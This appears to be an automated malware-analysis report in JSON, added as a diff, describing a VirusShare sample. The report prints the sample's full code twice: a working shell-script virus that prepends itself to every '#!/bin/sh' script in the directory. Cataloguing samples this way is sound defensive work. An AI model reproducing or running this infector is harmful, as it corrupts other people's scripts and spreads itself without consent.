@@ -1,0 +1,40 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": "\n#!/bin/sh\nfor F in *\ndo\n  if [ \"$(head -c9 $F 2>/dev/null)\" = \"#!/bin/sh\" ]\n  then\n        HOST=$(cat $F|tr '\\n' \\xc7)\n        head -11 $0 > $F 2>/dev/null\n        echo $HOST | tr \\xc7 '\\n' >> $F 2>/dev/null\n  fi\ndone"
+    },
+    "filename": "VirusShare_2589fa97e79d576d5ef7e911f83f7def",
+    "filesize": 230,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "2589fa97e79d576d5ef7e911f83f7def",
+        "sha1": "62ec9694585b694ea1b82302363fa5a228d5f50f",
+        "sha256": "a6ea891f07075a8a0f7548b220cc7f77ec250db33e950400f6a510e0f4ff0cd9"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/bin/sh",
+            "for F in *",
+            "  if [ \"$(head -c9 $F 2>/dev/null)\" = \"#!/bin/sh\" ]",
+            "  then",
+            "        HOST=$(cat $F|tr '\\n' \\xc7)",
+            "        head -11 $0 > $F 2>/dev/null",
+            "        echo $HOST | tr \\xc7 '\\n' >> $F 2>/dev/null",
+            "  fi",
+            "done"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.265260",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
